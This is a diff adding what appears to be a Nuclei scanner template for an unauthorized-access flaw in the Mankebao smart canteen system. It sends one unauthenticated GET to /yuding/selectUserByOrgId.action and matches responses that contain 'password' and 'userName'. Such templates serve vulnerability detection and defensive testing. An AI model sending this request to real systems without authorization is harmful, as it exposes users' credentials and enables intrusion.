@@ -1,0 +1,30 @@
+id: mankebao-selectUserByOrgId-unauthorized
+
+info:
+  name: 满客宝智慧食堂系统 selectUserByOrgId 未授权访问
+  author: unknown
+  severity: high
+  tags: unauthorized
+
+
+http:
+  - raw:
+      - |
+        GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'password'
+          - 'userName'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
